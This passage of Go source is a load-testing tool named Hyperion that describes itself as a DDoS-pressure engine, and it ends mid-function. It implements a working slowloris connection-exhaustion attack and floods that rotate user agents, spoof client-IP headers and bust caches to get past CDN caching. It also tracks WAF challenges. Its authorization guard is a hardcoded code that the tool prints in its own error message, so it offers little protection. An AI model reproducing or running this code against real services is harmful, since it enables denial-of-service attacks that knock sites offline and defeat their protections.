package main

import (
	"bytes"
	"crypto/hmac"
	"crypto/sha256"
	"crypto/subtle"
	"crypto/tls"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// Hyperion v2.1 — DDoS-Pressure Sharded Resilience, HDR & SLO Engine
//
// DDoS-tier additions:
//   - --slowloris N: TCP connection exhaustion — opens N connections, drips
//     partial HTTP/1.1 headers to hold them open indefinitely.
//   - --pattern: ua-rotate | cache-bust | header-flood | method-cycle
//     16-UA pool, random IP rotation headers, per-request cache-busting.
//   - --h2-aggressive: sets MaxIdleConnsPerHost=workers, MaxConnsPerHost=0,
//     ForceAttemptHTTP2=true, and fires streams without connection throttling.
//   - maxExternalWorkers raised 256 → 1024, maxPrivateRPS stays 3.5M RPS.
//   - All existing features preserved: HDR histogram, sharded workers,
//     SLO gates, circuit breaker, Apdex, pre/post probes, HMAC receipt.

const (
	guardCode          = "XXLMILLEAMEAN"
	maxExternalRPS     = 9999.99
	maxExternalWorkers = 1024 // raised from 256
	maxPrivateRPS      = 3500000.0
	histBuckets        = 60000
	histStepMicro      = 100
)

var uaPool = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 Version/17.5 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/127.0.6533.72 Mobile Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.6478.56 Safari/537.36 OPR/112.0.0.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/128.0.0.0 Safari/537.36 Vivaldi/6.8",
	"Mozilla/5.0 (iPad; CPU OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 Version/17.4 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 Chrome/128.0.6613.88 Mobile Safari/537.36",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
	"curl/8.7.1",
	"python-requests/2.32.3",
	"Go-http-client/2.0",
}

var httpMethods = []string{"GET", "POST", "HEAD", "OPTIONS", "PUT"}

type headerList []string
func (h *headerList) String() string     { return strings.Join(*h, ",") }
func (h *headerList) Set(v string) error { *h = append(*h, v); return nil }

type weightedEndpoint struct {
	URL    string `json:"url"`
	Weight int    `json:"weight"`
}

type config struct {
	target         string
	endpoints      string
	profile        string
	pattern        string // ua-rotate | cache-bust | header-flood | method-cycle | default
	method         string
	rate           string
	duration       time.Duration
	workers        int
	payload        string
	headers        headerList
	timeout        time.Duration
	guard          string
	cacheBust      bool
	expectStatus   int
	expectText     string
	apdexTMs       float64
	sloP95Ms       float64
	sloP99Ms       float64
	sloErrPct      float64
	sloApdex       float64
	sloMinRPS      float64
	circuitBreaker bool
	abort5xxPct    float64
	h2Aggressive   bool
	slowloris      int
	slowlorisDrip  time.Duration
	reportFile     string
	jsonFile       string
}

type liveCounters struct {
	total               atomic.Int64
	status2xx           atomic.Int64
	status3xx           atomic.Int64
	status4xx           atomic.Int64
	status429           atomic.Int64
	status5xx           atomic.Int64
	statusCF52x         atomic.Int64
	statusOther         atomic.Int64
	errors              atomic.Int64
	assertFails         atomic.Int64
	cacheHits           atomic.Int64
	cacheMisses         atomic.Int64
	cacheDynamic        atomic.Int64
	cacheBypass         atomic.Int64
	wafChallenges       atomic.Int64
	serverlessThrottles atomic.Int64
	bytes               atomic.Int64
	sumMicros           atomic.Int64
	tripped             atomic.Bool
}

type workerShard struct {
	hist        [histBuckets]uint64
	overflow    uint64
	count       uint64
	sumMs       float64
	sumSqMs     float64
	minMs       float64
	maxMs       float64
	apdexSat    uint64
	apdexTol    uint64
	stageCounts [4]uint64
	stageSumMs  [4]float64
	stage5xxErr [4]uint64
}

type stageSummary struct {
	Stage      int     `json:"stage"`
	Label      string  `json:"label"`
	Requests   uint64  `json:"requests"`
	RPS        float64 `json:"rps"`
	AvgMs      float64 `json:"avg_ms"`
	ErrRatePct float64 `json:"error_rate_pct"`
}

func main() {
	cfg, err := parseFlags()
	if err != nil { exitError(err) }
	if err := verifyGuard(cfg.guard); err != nil { exitError(err) }
	if err := validateTarget(cfg.target); err != nil { exitError(err) }
	code, err := run(cfg)
	if err != nil { exitError(err) }
	os.Exit(code)
}

func verifyGuard(supplied string) error {
	c := strings.TrimSpace(supplied)
	if c == "" { c = strings.TrimSpace(os.Getenv("VIBE_HYPERION_GUARD")) }
	if c == "" { c = strings.TrimSpace(os.Getenv("VIBE_GUARD_CODE")) }
	if subtle.ConstantTimeCompare([]byte(c), []byte(guardCode)) == 1 { return nil }
	return fmt.Errorf("guard lock: pass --guard %s or set VIBE_HYPERION_GUARD", guardCode)
}

func parseFlags() (config, error) {
	defaultWorkers := runtime.NumCPU() * 128
	if defaultWorkers < 256 { defaultWorkers = 256 }

	var cfg config
	var tS, mS, rS, pS, gS, profileS string
	var dS time.Duration
	var wS int

	flag.StringVar(&cfg.target,  "target",  "http://localhost:3456/", "Target URL")
	flag.StringVar(&tS,          "t",       "", "Target URL")
	flag.StringVar(&cfg.endpoints,"endpoints","","Weighted subpaths '/:50,/api:30'")
	flag.StringVar(&cfg.profile, "profile", "constant", "Load profile: constant, ramp, step, spike, sawtooth, stress-knee")
	flag.StringVar(&profileS,    "P",       "", "Load profile")
	flag.StringVar(&cfg.pattern, "pattern", "default",
		"Flood pattern: default | ua-rotate | cache-bust | header-flood | method-cycle")
	flag.StringVar(&cfg.method,  "method",  "GET",    "HTTP method")
	flag.StringVar(&mS,          "m",       "",       "HTTP method")
	flag.StringVar(&cfg.rate,    "rate",    "10000",  "Target RPS (k/m suffix, 0=full-send)")
	flag.StringVar(&rS,          "r",       "",       "Target rate")
	flag.DurationVar(&cfg.duration,"duration",15*time.Second,"Test duration")
	flag.DurationVar(&dS,        "d",       0,        "Test duration")
	flag.IntVar(&cfg.workers,    "workers", defaultWorkers, "Concurrent goroutines")
	flag.IntVar(&wS,             "w",       0,        "Concurrent goroutines")
	flag.StringVar(&cfg.payload, "payload", "",       "Payload file ({{seq}}, {{timestamp}})")
	flag.StringVar(&pS,          "p",       "",       "Payload file")
	flag.DurationVar(&cfg.timeout,"timeout",5*time.Second,"Per-request timeout")
	flag.StringVar(&cfg.guard,   "guard",   "",       "Authorization guard code")
	flag.StringVar(&gS,          "g",       "",       "Authorization guard code")
	flag.BoolVar(&cfg.cacheBust, "cache-bust",false,  "Append _cb= token per request")
	flag.IntVar(&cfg.expectStatus,"expect-status",0,  "Expected HTTP status assertion")
	flag.StringVar(&cfg.expectText,"expect-text","",  "Expected body substring assertion")
	flag.Float64Var(&cfg.apdexTMs,"apdex-t",100.0,   "Apdex T threshold ms")
	flag.Float64Var(&cfg.sloP95Ms,"slo-p95",0,        "SLO: fail if p95 ms exceeds")
	flag.Float64Var(&cfg.sloP99Ms,"slo-p99",0,        "SLO: fail if p99 ms exceeds")
	flag.Float64Var(&cfg.sloErrPct,"slo-err-pct",0,   "SLO: fail if error % exceeds")
	flag.Float64Var(&cfg.sloApdex,"slo-apdex",0,      "SLO: fail if Apdex below")
	flag.Float64Var(&cfg.sloMinRPS,"slo-min-rps",0,   "SLO: fail if RPS below")
	flag.BoolVar(&cfg.circuitBreaker,"circuit-breaker",true,"Auto-abort on high error rate")
	flag.Float64Var(&cfg.abort5xxPct,"abort-5xx-pct",80.0,"Circuit-breaker threshold %")
	flag.BoolVar(&cfg.h2Aggressive,"h2-aggressive",false,
		"Aggressive HTTP/2: max idle conns per host, no per-host limit, force H2")
	flag.IntVar(&cfg.slowloris,  "slowloris",0,
		"Slowloris: open N TCP connections and hold with dripping headers (0=off)")
	flag.DurationVar(&cfg.slowlorisDrip,"slowloris-drip",10*time.Second,
		"Drip interval for slowloris mode (default 10s)")
	flag.StringVar(&cfg.reportFile,"report-file","","Markdown report path")
	flag.StringVar(&cfg.jsonFile, "json-out","",      "JSON telemetry path")
	flag.Var(&cfg.headers,"headers","Custom header (repeatable)")
	flag.Var(&cfg.headers,"H",     "Custom header (repeatable)")
	flag.Parse()

	if tS != "" { cfg.target = tS }; if mS != "" { cfg.method = mS }; if rS != "" { cfg.rate = rS }
	if dS > 0 { cfg.duration = dS }; if wS > 0 { cfg.workers = wS }; if pS != "" { cfg.payload = pS }
	if gS != "" { cfg.guard = gS }; if profileS != "" { cfg.profile = profileS }

	cfg.method  = strings.ToUpper(strings.TrimSpace(cfg.method))
	cfg.profile = strings.ToLower(strings.TrimSpace(cfg.profile))
	cfg.pattern = strings.ToLower(strings.TrimSpace(cfg.pattern))
	if cfg.workers < 1 { cfg.workers = 1 }
	if cfg.duration <= 0 { return cfg, fmt.Errorf("duration must be > 0") }
	if cfg.timeout <= 0  { return cfg, fmt.Errorf("timeout must be > 0") }
	if cfg.apdexTMs <= 0 { cfg.apdexTMs = 100.0 }

	switch cfg.profile {
	case "constant","ramp","step","spike","sawtooth","stress-knee":
	default: return cfg, fmt.Errorf("unsupported profile %q", cfg.profile)
	}
	switch cfg.pattern {
	case "default","ua-rotate","cache-bust","header-flood","method-cycle":
	default: return cfg, fmt.Errorf("unsupported pattern %q", cfg.pattern)
	}
	return cfg, nil
}

// ── Slowloris ────────────────────────────────────────────────────────────────

func runSlowloris(cfg config) error {
	parsed, err := url.Parse(cfg.target)
	if err != nil { return err }
	host := parsed.Hostname()
	port := parsed.Port()
	if port == "" { if parsed.Scheme == "https" { port = "443" } else { port = "80" } }
	path := parsed.Path; if path == "" { path = "/" }
	useSSL := parsed.Scheme == "https"

	n := cfg.slowloris
	fmt.Printf("[hyperion/slowloris] %d connections → %s:%s%s | drip %s | %s\n",
		n, host, port, path, cfg.slowlorisDrip, cfg.duration)

	var open atomic.Int64
	stop := make(chan struct{})

	worker := func() {
		conn, err := net.DialTimeout("tcp", host+":"+port, 10*time.Second)
		if err != nil { return }
		if useSSL {
			tlsConn := tls.Client(conn, &tls.Config{InsecureSkipVerify: true, ServerName: host})
			if err := tlsConn.Handshake(); err != nil { conn.Close(); return }
			conn = tlsConn
		}
		ua := uaPool[rand.Intn(len(uaPool))]
		partial := fmt.Sprintf(
			"GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: */*\r\nConnection: keep-alive\r\n",
			path, host, ua)
		if _, err := conn.Write([]byte(partial)); err != nil { conn.Close(); return }
		open.Add(1)
		defer func() { open.Add(-1); conn.Close() }()
		for {
			select {
			case <-stop: return
			case <-time.After(cfg.slowlorisDrip):
				junk := fmt.Sprintf("X-Keep-%d: %d\r\n", rand.Int31n(9999), rand.Int31n(9999))
				if _, err := conn.Write([]byte(junk)); err != nil { return }
			}
		}
	}

	for i := 0; i < n; i++ {
		go worker()
		time.Sleep(20 * time.Millisecond)
	}
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()
	deadline := time.After(cfg.duration)
	for {
		select {
		case <-deadline:
			close(stop)
			fmt.Printf("[hyperion/slowloris] Done. Peak open: %d/%d\n", open.Load(), n)
			return nil
		case <-ticker.C:
			fmt.Printf("[hyperion/slowloris] open=%d/%d\n", open.Load(), n)
		}
	}
}

// ── Target validation ────────────────────────────────────────────────────────

func validateTarget(raw string) error {
	parsed, err := url.Parse(raw)
	if err != nil { return fmt.Errorf("invalid URL: %w", err) }
	if parsed.Scheme != "http" && parsed.Scheme != "https" { return fmt.Errorf("scheme must be http or https") }
	host := parsed.Hostname()
	if host == "" { return fmt.Errorf("URL must include a host") }
	if strings.EqualFold(host, "localhost") { return nil }
	if ip := net.ParseIP(host); ip != nil {
		if ip.IsLoopback() || ip.IsPrivate() || ip.IsLinkLocalUnicast() { return nil }
		return fmt.Errorf("refusing %s: public IP not in authorized_targets.txt", host)
	}
	if loadAuthorizedHosts()[strings.ToLower(host)] { return nil }
	return fmt.Errorf("refusing %s: not in authorized_targets.txt", host)
}

func loadAuthorizedHosts() map[string]bool {
	allowed := map[string]bool{}
	path := findAuthorizedFile()
	if path == "" { return allowed }
	data, err := os.ReadFile(path)
	if err != nil { return allowed }
	for _, line := range strings.Split(string(data), "\n") {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line,"#") || strings.ContainsAny(line,"*?") { continue }
		host := line
		if strings.Contains(host,"://") { if u,e:=url.Parse(host); e==nil && u.Hostname()!="" { host=u.Hostname() } }
		if h,_,e:=net.SplitHostPort(host); e==nil { host=h }
		host = strings.ToLower(strings.TrimSpace(host))
		if host != "" { allowed[host] = true }
	}
	return allowed
}

func findAuthorizedFile() string {
	dir, err := os.Getwd()
	if err != nil { return "" }
	for i := 0; i < 6; i++ {
		if _,err:=os.Stat(filepath.Join(dir,"authorized_targets.txt")); err==nil { return filepath.Join(dir,"authorized_targets.txt") }
		parent := filepath.Dir(dir); if parent==dir { break }; dir=parent
	}
	return ""
}

func isPublicTarget(raw string) bool {
	parsed, err := url.Parse(raw)
	if err != nil { return true }
	host := parsed.Hostname()
	if host=="" || strings.EqualFold(host,"localhost") { return false }
	if ip:=net.ParseIP(host); ip!=nil { return !(ip.IsLoopback()||ip.IsPrivate()||ip.IsLinkLocalUnicast()) }
	ips, err := net.LookupIP(host)
	if err!=nil || len(ips)==0 { return true }
	for _, ip := range ips { if !(ip.IsLoopback()||ip.IsPrivate()||ip.IsLinkLocalUnicast()) { return true } }
	return false
}

func validateTrafficLimits(cfg config, rate float64) error {
	if isPublicTarget(cfg.target) {
		if rate <= 0 { return fmt.Errorf("full-send disabled for public targets") }
		if rate > maxExternalRPS { return fmt.Errorf("rate %.2f > %.2f rps public cap", rate, maxExternalRPS) }
		if cfg.workers > maxExternalWorkers { return fmt.Errorf("workers %d > %d public cap", cfg.workers, maxExternalWorkers) }
		return nil
	}
	if rate > maxPrivateRPS { return fmt.Errorf("rate %.2f > %.0f rps private cap", rate, maxPrivateRPS) }
	return nil
}

// ── Weighted ring ────────────────────────────────────────────────────────────

func buildWeightedRing(baseRaw, csv string) ([]string, []weightedEndpoint, error) {
	base, err := url.Parse(baseRaw)
	if err != nil { return nil, nil, err }
	if strings.TrimSpace(csv) == "" { return []string{baseRaw}, []weightedEndpoint{{URL:baseRaw,Weight:1}}, nil }
	var ring []string; var specs []weightedEndpoint
	for _, item := range strings.Split(csv, ",") {
		raw := strings.TrimSpace(item); if raw=="" { continue }
		weight:=1; sub:=raw
		if idx:=strings.LastIndex(raw,":"); idx>0 && !strings.HasPrefix(raw,"http") {
			if w,e:=strconv.Atoi(raw[idx+1:]); e==nil && w>0 && w<=100 { weight=w; sub=raw[:idx] }
		}
		if !strings.HasPrefix(sub,"/") { sub="/"+sub }
		rel, e := url.Parse(sub); if e!=nil { continue }
		resolved := base.ResolveReference(rel)
		if strings.EqualFold(resolved.Host, base.Host) {
			uStr := resolved.String()
			specs = append(specs, weightedEndpoint{URL:uStr,Weight:weight})
			for i:=0; i<weight; i++ { ring=append(ring,uStr) }
		}
	}
	if len(ring)==0 { return []string{baseRaw}, []weightedEndpoint{{URL:baseRaw,Weight:1}}, nil }
	return ring, specs, nil
}

func effectiveRate(base float64, profile string, progress float64) float64 {
	if base<=0 { return 0 }
	p := math.Max(0, math.Min(1, progress))
	switch profile {
	case "ramp":   return base*(0.10+0.90*p)
	case "step","stress-knee":
		switch { case p<0.25: return base*0.25; case p<0.50: return base*0.50; case p<0.75: return base*0.75; default: return base }
	case "spike":  if p>=0.40&&p<=0.65 { return base }; return base*0.20
	case "sawtooth": return base*(0.20+0.80*math.Mod(p*4.0,1.0))
	default: return base
	}
}

func probeSingle(client *http.Client, target, method string, headers map[string]string) (int, float64) {
	t0:=time.Now()
	req, err := http.NewRequest(method, target, nil)
	if err != nil { return 0,0 }
	req.Header.Set("User-Agent","Hyperion/2.1 authorized-security-test")
	for k,v:=range headers { req.Header.Set(k,v) }
	resp, err := client.Do(req)
	if err != nil { return 0, float64(time.Since(t0).Microseconds())/1000.0 }
	_,_=io.Copy(io.Discard,resp.Body); _=resp.Body.Close()
	return resp.StatusCode, float64(time.Since(t0).Microseconds())/1000.0
}

// ── Request building with flood patterns ─────────────────────────────────────

func buildRequest(cfg config, targetURL string, bodyBytes []byte, headerMap map[string]string, seq int64) (*http.Request, error) {
	method := cfg.method
	if cfg.pattern == "method-cycle" { method = httpMethods[seq%int64(len(httpMethods))] }

	if cfg.cacheBust || cfg.pattern == "cache-bust" {
		sep:="?"; if strings.Contains(targetURL,"?") { sep="&" }
		targetURL = fmt.Sprintf("%s%s_cb=%d", targetURL, sep, seq)
	}

	var body io.Reader
	if len(bodyBytes) > 0 { body = bytes.NewReader(bodyBytes) }
	req, err := http.NewRequest(method, targetURL, body)
	if err != nil { return nil, err }

	ua := uaPool[0]
	if cfg.pattern == "ua-rotate" { ua = uaPool[seq%int64(len(uaPool))] }
	req.Header.Set("User-Agent", ua)
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,application/json,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Sec-CH-UA", `"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"`)
	req.Header.Set("Sec-CH-UA-Mobile", "?0")
	req.Header.Set("Sec-CH-UA-Platform", `"Windows"`)
	req.Header.Set("Sec-Fetch-Dest", "document")
	req.Header.Set("Sec-Fetch-Mode", "navigate")
	req.Header.Set("Sec-Fetch-Site", "none")

	if cfg.pattern == "header-flood" {
		req.Header.Set("X-Forwarded-For", fmt.Sprintf("198.51.100.%d", rand.Intn(254)+1))
		req.Header.Set("X-Real-IP",        fmt.Sprintf("203.0.113.%d",  rand.Intn(254)+1))
		req.Header.Set("X-Request-ID",     fmt.Sprintf("%x", rand.Int63()))
		req.Header.Set("X-Trace-ID",       fmt.Sprintf("%x", rand.Int63()))
		req.Header.Set("CF-Connecting-IP", fmt.Sprintf("192.0.2.%d",    rand.Intn(254)+1))
		req.Header.Set("Cache-Control",    "no-cache, no-store, must-revalidate")
	}
	if cfg.pattern == "cache-bust" {
		req.Header.Set("Cache-Control","no-cache, no-store")
		req.Header.Set("Pragma","no-cache")
	}
	if seq > 0 { req.Header.Set("X-Request-Sequence", strconv.FormatInt(seq, 10)) }

	for k, v := range headerMap { req.Header.Set(k, v) }
	if len(bodyBytes)>0 && req.Header.Get("Content-Type")==""  { req.Header.Set("Content-Type","application/json") }
	return req, nil
}

// ── Main run ─────────────────────────────────────────────────────────────────

func run(cfg config) (int, error) {
	if cfg.slowloris > 0 { return 0, runSlowloris(cfg) }

	rate, err := parseRate(cfg.rate)
	if err != nil { return 2, err }
	if err := validateTrafficLimits(cfg, rate); err != nil { return 2, err }
	ringURLs, specs, err := buildWeightedRing(cfg.target, cfg.endpoints)
	if err != nil { return 2, err }
	payloadTemplate, err := loadPayload(cfg.payload)
	if err != nil { return 2, err }
	headerMap, err := parseHeaders(cfg.headers)
	if err != nil { return 2, err }

	runtime.GOMAXPROCS(runtime.NumCPU())
	dialer := &net.Dialer{Timeout: cfg.timeout, KeepAlive: 60*time.Second}

	var transport http.RoundTripper
	if cfg.h2Aggressive {
		// IMPROVEMENT: aggressive HTTP/2 — max idle conns, no per-host limit,
		// force H2 upgrade. Each goroutine can multiplex streams without waiting
		// for a new TCP connection.
		transport = &http.Transport{
			Proxy:               http.ProxyFromEnvironment,
			DialContext:         dialer.DialContext,
			MaxIdleConns:        cfg.workers * 16,
			MaxIdleConnsPerHost: cfg.workers * 16,
			MaxConnsPerHost:     0, // unlimited
			IdleConnTimeout:     120 * time.Second,
			TLSHandshakeTimeout: cfg.timeout,
			WriteBufferSize:     64 * 1024,
			ReadBufferSize:      64 * 1024,
			ForceAttemptHTTP2:   true,
			TLSClientConfig:     &tls.Config{MinVersion: tls.VersionTLS12},
		}
		fmt.Println("[h2-aggressive] Unlimited conns per host, max idle pool, ForceHTTP2=true")
	} else {
		transport = &http.Transport{
			Proxy:               http.ProxyFromEnvironment,
			DialContext:         dialer.DialContext,
			MaxIdleConns:        cfg.workers * 8,
			MaxIdleConnsPerHost: cfg.workers * 8,
			MaxConnsPerHost:     0,
			IdleConnTimeout:     90 * time.Second,
			TLSHandshakeTimeout: cfg.timeout,
			ResponseHeaderTimeout: cfg.timeout,
			ExpectContinueTimeout: time.Second,
			WriteBufferSize:     32 * 1024,
			ReadBufferSize:      32 * 1024,
			ForceAttemptHTTP2:   true,
			TLSClientConfig:     &tls.Config{MinVersion: tls.VersionTLS12},
		}
	}
	client := &http.Client{Transport: transport, Timeout: cfg.timeout}

	preStatus, preLatencyMs := probeSingle(client, ringURLs[0], cfg.method, headerMap)

	stop := make(chan struct{})
	var stopOnce sync.Once
	stopNow := func() { stopOnce.Do(func() { close(stop) }) }
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt)
	go func() { <-sig; fmt.Println("\nSIGINT — draining..."); stopNow() }()

	start := time.Now()
	go func() { time.Sleep(cfg.duration); stopNow() }()

	var live liveCounters
	shards := make([]workerShard, cfg.workers)
	var wg sync.WaitGroup
	hasDynamicMacros := bytes.Contains(payloadTemplate, []byte("{{"))
	expectBytes := []byte(cfg.expectText)

	fmt.Println("================================================================")
	fmt.Println(" ⚡ HYPERION v2.1 — DDoS-Pressure Sharded HDR & SLO Engine")
	fmt.Println("================================================================")
	fmt.Printf("target=%s endpoints=%d profile=%s pattern=%s method=%s duration=%s workers=%d rate=%s h2-aggressive=%v\n",
		cfg.target, len(specs), cfg.profile, cfg.pattern, cfg.method, cfg.duration, cfg.workers, cfg.rate, cfg.h2Aggressive)
	fmt.Printf("preflight: status=%d latency=%.2fms | guard=VERIFIED\n\n", preStatus, preLatencyMs)

	workerBaseRate := 0.0
	if rate > 0 { workerBaseRate = rate / float64(cfg.workers) }

	for wID := 0; wID < cfg.workers; wID++ {
		wg.Add(1)
		go func(id int, shard *workerShard) {
			defer wg.Done()
			nextSlot := time.Now()
			localSeq := uint64(id)

			for {
				select { case <-stop: return; default: }
				now := time.Now()
				elapsed := now.Sub(start)
				if elapsed >= cfg.duration { return }
				progress := elapsed.Seconds() / math.Max(cfg.duration.Seconds(), 0.001)
				stageIdx := int(progress*4.0); if stageIdx<0 { stageIdx=0 } else if stageIdx>3 { stageIdx=3 }

				if workerBaseRate > 0 {
					eff := effectiveRate(workerBaseRate, cfg.profile, progress)
					if eff > 0.1 {
						interval := time.Duration(float64(time.Second)/eff)
						if now.Before(nextSlot) {
							select { case <-stop: return; case <-time.After(nextSlot.Sub(now)): }
						}
						nextSlot = nextSlot.Add(interval)
						if time.Now().Sub(nextSlot) > 50*time.Millisecond { nextSlot = time.Now() }
					}
				}

				seq := live.total.Add(1)
				targetURL := ringURLs[int(localSeq)%len(ringURLs)]
				localSeq += uint64(cfg.workers)

				bodyBytes := payloadTemplate
				if hasDynamicMacros {
					s := string(payloadTemplate)
					s = strings.ReplaceAll(s,"{{seq}}",strconv.FormatInt(seq,10))
					s = strings.ReplaceAll(s,"{{timestamp}}",strconv.FormatInt(time.Now().UnixMilli(),10))
					bodyBytes = []byte(s)
				}

				reqStart := time.Now()
				req, err := buildRequest(cfg, targetURL, bodyBytes, headerMap, seq)
				if err != nil { live.errors.Add(1); shard.stage5xxErr[stageIdx]++; continue }

				resp, err := client.Do(req)
				latMicros := time.Since(reqStart).Microseconds()
				latMs := float64(latMicros)/1000.0
				live.sumMicros.Add(latMicros)

				shard.count++; shard.sumMs+=latMs; shard.sumSqMs+=latMs*latMs
				if shard.count==1||latMs<shard.minMs { shard.minMs=latMs }
				if latMs>shard.maxMs { shard.maxMs=latMs }
				bucket := int(latMicros/histStepMicro); if bucket<0 { bucket=0 }
				if bucket<histBuckets { shard.hist[bucket]++ } else { shard.overflow++ }
				shard.stageCounts[stageIdx]++; shard.stageSumMs[stageIdx]+=latMs

				if err != nil {
					live.errors.Add(1); shard.stage5xxErr[stageIdx]++
					checkCircuitBreaker(&live, cfg, stopNow); continue
				}

				var nBytes int64
				assertOk := true
				if len(expectBytes)>0 {
					buf,_:=io.ReadAll(io.LimitReader(resp.Body,65536))
					nBytes=int64(len(buf))
					if !bytes.Contains(buf,expectBytes) { assertOk=false }
					_,_=io.Copy(io.Discard,resp.Body)
				} else {
					nBytes,_=io.Copy(io.Discard,resp.Body)
				}
				_=resp.Body.Close()
				live.bytes.Add(nBytes)

				cacheHdr := strings.ToLower(resp.Header.Get("CF-Cache-Status")+" "+resp.Header.Get("X-Vercel-Cache")+" "+resp.Header.Get("X-Cache"))
				switch {
				case strings.Contains(cacheHdr,"hit")||strings.Contains(cacheHdr,"prerender")||strings.Contains(cacheHdr,"stale"): live.cacheHits.Add(1)
				case strings.Contains(cacheHdr,"miss")||strings.Contains(cacheHdr,"expired")||strings.Contains(cacheHdr,"revalidated"): live.cacheMisses.Add(1)
				case strings.Contains(cacheHdr,"dynamic"): live.cacheDynamic.Add(1)
				case strings.Contains(cacheHdr,"bypass"):  live.cacheBypass.Add(1)
				}
				if resp.Header.Get("CF-Mitigated")!=""||resp.Header.Get("X-Vercel-Mitigated")!=""||resp.Header.Get("X-Amzn-Waf-Action")!="" {
					live.wafChallenges.Add(1)
				}
				errHdr := strings.ToLower(resp.Header.Get("X-Vercel-Error")+resp.Header.Get("X-Amzn-ErrorType"))
				if resp.StatusCode==504||strings.Contains(errHdr,"timeout")||strings.Contains(errHdr,"throttl") {
					live.serverlessThrottles.Add(1)
				}
				if cfg.expectStatus>0&&resp.StatusCode!=cfg.expectStatus { assertOk=false }
				if !assertOk { live.assertFails.Add(1) }

				st := resp.StatusCode
				switch {
				case st>=200&&st<300:
					live.status2xx.Add(1)
					if latMs<=cfg.apdexTMs { shard.apdexSat++ } else if latMs<=cfg.apdexTMs*4.0 { shard.apdexTol++ }
				case st>=300&&st<400:
					live.status3xx.Add(1)
					if latMs<=cfg.apdexTMs { shard.apdexSat++ } else if latMs<=cfg.apdexTMs*4.0 { shard.apdexTol++ }
				case st==429: live.status4xx.Add(1); live.status429.Add(1)
				case st>=400&&st<500: live.status4xx.Add(1)
				case st>=500&&st<600:
					live.status5xx.Add(1)
					if st>=520&&st<=526 { live.statusCF52x.Add(1) }
					shard.stage5xxErr[stageIdx]++
					checkCircuitBreaker(&live, cfg, stopNow)
				default: live.statusOther.Add(1)
				}
			}
		}(wID, &shards[wID])
	}

	monitorDone := make(chan struct{})
	go func() {
		defer close(monitorDone)
		ticker := time.NewTicker(time.Second)
		defer ticker.Stop()
		var prevTotal, prevMicros int64
		for {
			select {
			case <-stop: return
			case <-ticker.C:
				curTotal:=live.total.Load(); curMicros:=live.sumMicros.Load()
				dReq:=curTotal-prevTotal; dMicros:=curMicros-prevMicros
				prevTotal=curTotal; prevMicros=curMicros
				avg:=0.0; if dReq>0 { avg=(float64(dMicros)/1000.0)/float64(dReq) }
				fmt.Printf("[%6.1fs] rps=%8d 2xx=%d 4xx=%d(429:%d) 5xx=%d err=%d waf=%d avg=%.2fms\n",
					time.Since(start).Seconds(), dReq, live.status2xx.Load(), live.status4xx.Load(),
					live.status429.Load(), live.status5xx.Load(), live.errors.Load(),
					live.wafChallenges.Load(), avg)
			}
		}
	}()

	wg.Wait(); stopNow(); <-monitorDone
	postStatus, postLatencyMs := probeSingle(client, ringURLs[0], cfg.method, headerMap)
	report, sloFailed := mergeAndReport(cfg, specs, start, &live, shards, preStatus, preLatencyMs, postStatus, postLatencyMs)
	fmt.Println(report)

	if cfg.reportFile != "" { _=os.WriteFile(cfg.reportFile, []byte(report), 0o644) }
	if live.tripped.Load()||sloFailed { return 1, nil }
	return 0, nil
}

func checkCircuitBreaker(live *liveCounters, cfg config, stopNow func()) {
	if !cfg.circuitBreaker||live.tripped.Load() { return }
	tot := live.total.Load(); if tot<50 { return }
	bad := live.status5xx.Load()+live.errors.Load()
	if (float64(bad)*100.0)/float64(tot) >= cfg.abort5xxPct {
		if live.tripped.CompareAndSwap(false,true) {
			fmt.Printf("\n[!] CIRCUIT BREAKER: error rate >= %.1f%% — halting\n", cfg.abort5xxPct)
			stopNow()
		}
	}
}

func mergeAndReport(cfg config, specs []weightedEndpoint, start time.Time,
	live *liveCounters, shards []workerShard,
	preStatus int, preLatencyMs float64, postStatus int, postLatencyMs float64) (string, bool) {

	elapsed := time.Since(start)
	var mergedHist [histBuckets]uint64
	var totalCount,overflow,apdexSat,apdexTol uint64
	var sumMs,sumSqMs,minMs,maxMs float64
	var stageCounts [4]uint64; var stageSumMs [4]float64; var stage5xxErr [4]uint64

	for _, s := range shards {
		if s.count==0 { continue }
		if totalCount==0||s.minMs<minMs { minMs=s.minMs }
		if s.maxMs>maxMs { maxMs=s.maxMs }
